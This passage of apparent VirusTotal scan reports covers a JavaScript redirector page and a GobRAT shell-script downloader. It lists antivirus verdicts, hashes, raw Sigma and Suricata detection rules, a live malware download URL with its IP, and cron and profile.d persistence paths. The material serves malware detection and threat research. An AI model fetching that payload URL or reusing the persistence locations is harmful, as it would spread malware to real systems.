          "recipe.asp?name=      &id=2016121656&lang=ru",
          "http://www.russiantable.com/store/affiliate/b.asp?id=4500",
          "javascript: window.external.AddFavorite(location.href, document.title);",
          "javascript:window.print();",
          "mailto:info@kushaem.com",
          "recipelist.asp?cat=",
          "http://www.kushaem.com"
        ],
        "scripts": [
          {
            "attributes": {
              "src": "/js/common.js",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "/js/comments.js",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "9a8e9fa6653abbb75035e6fa2af3a20a0500a21b702b7b2ba4581b3c7fc23ac0"
          },
          {
            "attributes": {
              "src": "http://pagead2.googlesyndication.com/pagead/show_ads.js",
              "type": "text/javascript"
            },
            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "84ce9baf84128422fd7745394213c8af0880db12c909db322beb7e723055b082"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "a948411cebc2715a38f6ed1f4c014c71db73de5654a65d7ac8141365ac29cfe0"
          }
        ],
        "title": "* : kushaem.com"
      },
      "javascript_info": {
        "tags": [
          "write+unescape",
          "malformed"
        ]
      },
      "last_submission_date": 1696584765,
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.JS.Redirector.4!c",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "DrWeb": {
          "category": "malicious",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": "Trojan.DownLoader29.27000",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.2.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": "Trojan.GenericKD.37377809",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "CAT-QuickHeal": {
          "category": "malicious",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": "JS.Redirector.DW",
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "Skyhigh": {
          "category": "undetected",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": "Trojan.GenericKD.37377809",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "Trojan.GenericKD.37377809",
          "method": "blacklist",
          "engine_update": "20231004"
        },
        "Sangfor": {
          "category": "undetected",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230926"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.118.49792",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.118.49792",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230928"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.551",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.20.0.0",
          "result": "Trojan.Gen.NPE",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Elastic": {
          "category": "type-unsupported",
          "engine_name": "Elastic",
          "engine_version": "4.0.111",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231002"
        },
        "ESET-NOD32": {
          "category": "undetected",
          "engine_name": "ESET-NOD32",
          "engine_version": "28026",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.461",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231004"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": "JS:Redirector-CAG [Trj]",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Cynet": {
          "category": "undetected",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.27",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "Trojan.JS.Redirector.afa",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Trojan.GenericKD.37377809",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "NANO-Antivirus": {
          "category": "undetected",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Trojan.GenericKD.37377809",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Tencent": {
          "category": "undetected",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2023-10-06.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Sophos": {
          "category": "undetected",
          "engine_name": "Sophos",
          "engine_version": "2.3.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "F-Secure": {
          "category": "undetected",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1137.128",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.4968",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "SentinelOne": {
          "category": "type-unsupported",
          "engine_name": "SentinelOne",
          "engine_version": "23.3.0.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230705"
        },
        "Trapmine": {
          "category": "type-unsupported",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.91",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230907"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230822"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "Trojan.GenericKD.37377809 (B)",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "231006-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1696579227",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Avira": {
          "category": "undetected",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Kingsoft": {
          "category": "undetected",
          "engine_name": "Kingsoft",
          "engine_version": "2023.8.30.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23090.2007",
          "result": "Trojan:Script/Wacatac.B!ml",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.142.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Xcitium": {
          "category": "malicious",
          "engine_name": "Xcitium",
          "engine_version": "36060",
          "result": "TrojWare.JS.Redirector.AR@7o1yog",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "Trojan.Generic.D23A5711",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "Trojan.JS.Redirector.afa",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.36612B:27.33398",
          "result": "Trojan.GenericKD.37377809",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Varist": {
          "category": "undetected",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230921"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.24.0.10447",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": "malware (ai score=83)",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231004"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Rising": {
          "category": "undetected",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": "Trojan.Script.GenericZ",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Trojan.Malware.121218.susgen",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "HTML/Redirector.67A5!tr",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": "JS:Redirector-CAG [Trj]",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230927"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20220812"
        }
      },
      "sha256": "238890dc1f44bd51197f998c96e5441f22bd2cbf6053bfbbaa5b0ac61d3a8be2",
      "type_extension": "js",
      "tags": [
        "javascript",
        "contains-embedded-js"
      ],
      "last_analysis_date": 1696584765,
      "unique_sources": 2,
      "first_submission_date": 1628590850,
      "ssdeep": "96:lhAyDXAyvQZ5E/TE7BXehGSkUf23LIYjoCFSua8kw5t:lhPXTtTEuLf20Y/UuaSt",
      "md5": "7880cf69506ffb0b429b0e5dd81240c2",
      "sha1": "a04834d8f71e3a5a57dcbeddbdbac6616b668c91",
      "magic": "HTML document, ISO-8859 text, with very long lines (636u), with CRLF, LF line terminators",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 16,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 23,
        "undetected": 37
      },
      "meaningful_name": "VirusShare_7880cf69506ffb0b429b0e5dd81240c2",
      "reputation": -7
    },
    "type": "file",
    "id": "238890dc1f44bd51197f998c96e5441f22bd2cbf6053bfbbaa5b0ac61d3a8be2",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/238890dc1f44bd51197f998c96e5441f22bd2cbf6053bfbbaa5b0ac61d3a8be2"
    }
  }
},
{
  "_id": {
    "$oid": "65b4f4147351d3c42d2876b5"
  },
  "data": {
    "attributes": {
      "type_description": "Shell script",
      "tlsh": "T118D1F098B830DD78BD049DE8F5A7F314BDB9C06BD8129A08B49E34B823DC756B41C52D",
      "type_tags": [
        "script",
        "shell"
      ],
      "names": [
        "sdaidapguyeblhyhbbkd"
      ],
      "last_modification_date": 1705543000,
      "type_tag": "shell",
      "times_submitted": 1,
      "total_votes": {
        "harmless": 0,
        "malicious": 2
      },
      "size": 6319,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.gobrat/shell",
        "popular_threat_category": [
          {
            "count": 15,
            "value": "trojan"
          },
          {
            "count": 3,
            "value": "downloader"
          }
        ],
        "popular_threat_name": [
          {
            "count": 5,
            "value": "gobrat"
          },
          {
            "count": 5,
            "value": "shell"
          }
        ]
      },
      "last_submission_date": 1672086196,
      "sigma_analysis_results": [
        {
          "rule_title": "Persistence Via Cron Files",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "TargetFilename": "/var/spool/cron/crontabs/tmp.rLsbe1"
              }
            }
          ],
          "rule_level": "medium",
          "rule_description": "Detects creation of cron file or files in Cron directories which could indicates potential persistence.",
          "rule_author": "Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC",
          "rule_id": "f74e8628441aa3b7bcbf82dd77cc025925e34078d02d169dd947db62675dbeaa"
        },
        {
          "rule_title": "Potentially Suspicious Shell Script Creation in Profile Folder",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "TargetFilename": "/etc/profile.d/sshdaemon.sh"
              }
            }
          ],
          "rule_level": "low",
          "rule_description": "Detects the creation of shell scripts under the \"profile.d\" path.",
          "rule_author": "Joseliyo Sanchez, @Joseliyo_Jstnk",
          "rule_id": "75fbf85188235a403847898f76531554e988c5316df1299753442fad2ee0b7b1"
        }
      ],
      "meaningful_name": "sdaidapguyeblhyhbbkd",
      "crowdsourced_ids_stats": {
        "high": 0,
        "info": 1,
        "medium": 1,
        "low": 2
      },
      "trid": [
        {
          "file_type": "Linux/UNIX shell script",
          "probability": 100
        }
      ],
      "sigma_analysis_summary": {
        "Sigma Integrated Rule Set (GitHub)": {
          "high": 0,
          "medium": 1,
          "critical": 0,
          "low": 1
        }
      },
      "sandbox_verdicts": {
        "Zenbox": {
          "category": "harmless",
          "sandbox_name": "Zenbox",
          "malware_classification": [
            "CLEAN"
          ]
        },
        "Zenbox Linux": {
          "category": "malicious",
          "confidence": 76,
          "sandbox_name": "Zenbox Linux",
          "malware_classification": [
            "MALWARE",
            "SPREADER",
            "TROJAN",
            "EVADER"
          ]
        }
      },
      "sha256": "60bcd645450e4c846238cf0e7226dc40c84c96eba99f6b2cffcd0ab4a391c8b3",
      "type_extension": "sh",
      "tags": [
        "shell",
        "self-delete",
        "detect-debug-environment",
        "idle",
        "direct-cpu-clock-access",
        "persistence"
      ],
      "crowdsourced_ids_results": [
        {
          "rule_category": "Attempted Information Leak",
          "alert_severity": "medium",
          "rule_msg": "ET POLICY curl User-Agent Outbound",
          "rule_raw": "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET POLICY curl User-Agent Outbound\"; flow:established,to_server; http.user_agent; content:\"curl/\"; nocase; startswith; reference:url,www.useragentstring.com/pages/useragentstring.php; classtype:attempted-recon; sid:2013028; rev:7; metadata:created_at 2011_06_14, updated_at 2022_05_03;)",
          "alert_context": [
            {
              "url": "http://ktlvz.dnsfailover.net/zone.x86_64",
              "hostname": "ktlvz.dnsfailover.net",
              "dest_port": 58888,
              "dest_ip": "5.8.16.23"
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_references": [
            "https://www.useragentstring.com/pages/useragentstring.php"
          ],
          "rule_id": "1:2013028"
        },
        {
          "rule_category": "Potentially Bad Traffic",
          "alert_severity": "low",
          "rule_msg": "ET INFO DYNAMIC_DNS Query to a *.dnsfailover .net Domain",
          "rule_raw": "alert dns $HOME_NET any -> any any (msg:\"ET INFO DYNAMIC_DNS Query to a *.dnsfailover .net Domain\"; dns.query; content:\".dnsfailover.net\"; fast_pattern; nocase; endswith; reference:url,changeip.com; classtype:bad-unknown; sid:2036092; rev:1; metadata:attack_target Client_and_Server, created_at 2022_04_14, deployment Perimeter, performance_impact Low, signature_severity Informational, updated_at 2022_04_14;)",
          "alert_context": [
            {
              "dest_port": 53,
              "dest_ip": "8.8.8.8"
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_references": [
            "https://changeip.com"
          ],
          "rule_id": "1:2036092"
        },
        {
          "rule_category": "Generic Protocol Command Decode",
          "alert_severity": "low",
          "rule_msg": "SURICATA STREAM excessive retransmissions",
          "rule_raw": "alert tcp any any -> any any (msg:\"SURICATA STREAM excessive retransmissions\"; flowbits:isnotset,tcp.retransmission.alerted; flowint:tcp.retransmission.count,>=,10; flowbits:set,tcp.retransmission.alerted; classtype:protocol-command-decode; sid:2210054; rev:1;)",
          "alert_context": [
            {
              "src_ip": "5.8.16.23",
              "src_port": 443,
              "ja3": [
                "fb4726d465c5f28b84cd6d14cedd13a7"
              ],
              "ja3s": [
                "f4febc55ea12b31ae17cfb7e614afda8"
              ]
            }
          ],
          "rule_url": "https://www.openinfosecfoundation.org/",
          "rule_source": "Suricata",
          "rule_id": "1:2210054"
        },
        {
          "rule_category": "Potential Corporate Privacy Violation",
          "alert_severity": "info",
          "rule_msg": "ET POLICY Executable and linking format (ELF) file download",
          "rule_raw": "alert tcp $EXTERNAL_NET !$HTTP_PORTS -> $HOME_NET any (msg:\"ET POLICY Executable and linking format (ELF) file download\"; flow:established; content:\"|7F|ELF\"; fast_pattern; content:\"|00 00 00 00 00 00 00 00|\"; distance:3; flowbits:set,ET.ELFDownload; reference:url,www.itee.uq.edu.au/~cristina/students/david/honoursThesis96/bff.htm; reference:url,doc.emergingthreats.net/bin/view/Main/2000418; classtype:policy-violation; sid:2000418; rev:17; metadata:created_at 2010_07_30, updated_at 2021_11_18;)",
          "alert_context": [
            {
              "src_ip": "5.8.16.23",
              "url": "http://ktlvz.dnsfailover.net/zone.x86_64",
              "hostname": "ktlvz.dnsfailover.net",
              "src_port": 58888
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_references": [
            "https://www.itee.uq.edu.au/~cristina/students/david/honoursThesis96/bff.htm",
            "https://doc.emergingthreats.net/bin/view/Main/2000418"
          ],
          "rule_id": "1:2000418"
        }
      ],
      "last_analysis_date": 1688492938,
      "unique_sources": 1,
      "first_submission_date": 1672086196,
      "ssdeep": "96:oHRm+NMMUTGWbgZl+Idm1VLvdPEy0dOE5/7lH13nXgxmVALEDpIp8HZQeEZy/dnb:oHR8MUSO4+IQjd+OxxwPFZQj0b",
      "md5": "50dfc198d1bcbb10287264c172ea6049",
      "sha1": "13988345cddaa67e616ae24cd8d8786949dd0b82",
      "magic": "POSIX shell script, ASCII text executable, with very long lines (423u)",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 16,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 25,
        "undetected": 34
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.Script.Agent.4!c",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": null,
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "7.0.59.12300",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.1.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230619"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230703"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": "Trojan.Downloader.Shell.Agent",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "Trojan.Linux.Generic.298138",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Sangfor": {
          "category": "undetected",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.95.48849",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.95.48849",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": null
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230621"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.483",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Cyren": {
          "category": "undetected",
          "engine_name": "Cyren",
          "engine_version": "6.5.1.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.20.0.0",
          "result": "Downloader",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Elastic": {
          "category": "type-unsupported",
          "engine_name": "Elastic",
          "engine_version": "4.0.98",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230628"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "27516",
          "result": "Linux/GobRAT.A",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.429",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "TrendMicro-HouseCall": {
          "category": "malicious",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": "TROJ_FRS.0NA103FM23",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "22.11.7701.0",
          "result": "BV:GobRat-A [Drp]",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Cynet": {
          "category": "undetected",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.27",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "HEUR:Trojan.Shell.Agent.bv",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "Trojan.Linux.Generic.298138",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "NANO-Antivirus": {
          "category": "undetected",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25785",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "ViRobot": {
          "category": "malicious",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": "BIN.S.Agent.6319",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "Trojan.Linux.Generic.298138",
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Rising": {
          "category": "undetected",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230704"
        },
        "TACHYON": {
          "category": "undetected",
